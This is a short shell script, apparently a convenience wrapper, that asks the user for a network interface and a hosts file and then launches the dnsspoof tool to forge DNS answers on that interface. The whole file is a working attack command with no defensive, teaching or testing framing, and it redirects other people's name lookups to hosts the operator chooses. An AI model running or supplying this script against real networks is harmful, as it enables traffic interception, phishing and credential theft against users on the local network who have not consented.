echo "Enter the interface"
read interface 
echo "Enter the host file : "
read hostfile
echo "dns spoof starte by dnsspoof ..." 
dnsspoof -i $interface -f $hostfile
